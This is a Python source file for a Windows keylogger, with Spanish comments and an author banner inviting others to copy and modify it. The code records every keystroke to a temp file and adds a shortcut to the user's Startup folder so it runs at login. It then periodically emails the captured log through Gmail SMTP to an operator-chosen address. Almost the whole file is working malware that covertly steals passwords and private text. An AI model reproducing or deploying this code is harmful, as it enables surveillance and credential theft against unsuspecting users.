# Keylogger creado por Edinson Requena y editado, traducido y comentado por Xabier Gabiña.

# Script editado el 10/04/2020 por Xabier Gabiña ak.Xabierland
# Mi Github: https://github.com/Xabierland
# Mi Twitter: https://twitter.com/Xabierland
# Mi Instagram: https://www.instagram.com/xabierland/

# La lista de librerias importadas
from pynput.keyboard import Key, Listener
import os, shutil, datetime, winshell, tempfile, smtplib
from win32com.client import Dispatch
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
import threading, socket

# Las 4 lineas inferiores son las encargadas de crear y guardar las direcciones de todo lo relativo al proyecto.
save = tempfile.mkdtemp("temp_file")    # Crea el archivo temporal donde se guardara todas las pulsaciones.
print(save)                             # Imprime en la consola la ruta donde se guarda el archivo temporal.
cwd = os.getcwd()                       # Guarda la direccion del proceso.
source = os.listdir()                   # Guarda todo los nombres de los archivos del directiro del proceso.

dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")    #Guarda la fecha y la hora en la variable dateAndtime.

filename = save+"\key_log"+dateAndtime+".txt" 
open(filename,"w+")     # Abre (o crea en caso de no existir) el archivo en modo de escritura (r - read | w - write | x - create)
keys=[]
count = 0 
countInternet = 0
word = "Key."   # Variable donde se almacena una tecla especial pulsada
username = os.getlogin()    # Obtiene el nombre de usuario de la sesion activa
destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username) # Ruta donde se guardara el archivo temporal con el registro del teclado

#
def _dir():
    path = os.path.join(destination, "hack.pyw - Shortcut.lnk")
    target = r""+cwd+"\hack.pyw"
    icon = r""+cwd+"\hack.pyw"
    for files in source:
        if files == "hack.pyw":
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()

# Inicializa las tres variables que usa el programa
email = None    
password = None
gmail = None

# Introducir los datos necesarios para el envio del archivo resultante del funcionamiento del keylogger
def intro_data():
    global gmail, password, email

    gmail = input("Introduce la cuenta que enviara el correo: ")
    password = input("Introduce la contraseña de la cuenta que enviara el correo: ")
    email = input("Introduce la cuenta que recibira el correo: ")

# Verifica si nuestro archivo se ha guardado en la variable destination y llamamos a la funcion _dir()
shortcut = 'hack.pyw - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    _dir()

#
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

# Se encarga de comprobar que se ha introducido algo en las variables gmail, password y email
def _validation():
    global gmail, password, email

    return len(gmail) != 0 and len(password) != 0 and len(email) != 0

#
def field_inputs():
    if _validation():
        send_email()
    else:
        print("Error")

#
def send_email():
    global gmail, password, email

    msg = MIMEMultipart()
    msg['From'] = gmail
    msg['To'] = email
    msg['Subject'] = "Don't be evil"
    body = "Keylogger programado por Edison Requena y editado por mi, Xabier Gabiña."

    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail, password)
    text = msg.as_string()
    server.sendmail(gmail, email, text)
    server.quit()

#
def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:
            if key == 'Key.enter': # escribe una nueva línea.
                f.write("\n")
            elif key == 'Key.space': 
                f.write(key.replace("Key.space"," ")) # ingresa un espacio
            elif key == 'Key.backspace':
                f.write(key.replace("Key.backspace","$")) # ingresará un $
            elif key[:4] == word:# para otros caracteres que no tuve en cuenta para hacer mas practico el tutorial
                pass
            else:  # reenvia palabras que escribimos en el archivo.
                f.write(key.replace("'",""))
            # Recuerda que todo esto es modificable, investigando un poco mas a fondo podrias hacer de tu mensaje uno mucho mas legible,
            # aunque este ya lo es

#
def on_press(key):
    global keys, count, countInternet, filename
    keys.append(str(key))

    if len(keys) > 10:
        write_file(keys)
        if is_connected():
            count += 1
            print('connected {}'.format(count))
            if count > 5:

                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()
        else:
            countInternet += 1
            print('not connected',countInternet)
            if countInternet > 10:
                countInternet = 0
                filename = filename.strip(save)
                for files in save:
                    if files == filename:
                        shutil.copy(files+"t",source)
        keys.clear()

#
if __name__ == '__main__':
    print("*"*20 ,"Bienvenido al Keylogger", "*"*20)
    print("Escribe la primera letra de la opcion elegirla.")
    print("[I]ntroducir lo datos")
    print("[H]elp")
    print("\n")
    print("*Este keylogger fue creado por Edinson Requena y editado, traducido y comentado por Xabier Gabiña. Sientete libre de modificarlo, descargarlo o copiarlo. Usalo bien <3*")
    print("Escribe a requenasoftware@gmail.com o entra en xabierland.eus/contact en caso de tener alguna duda o problema")

    command = input()
    command = command.upper()

    if command == "I" or command == "i":
        intro_data()
    elif command == "H" or command == "h":
        pass

    with Listener(on_press=on_press) as listener:
       listener.join()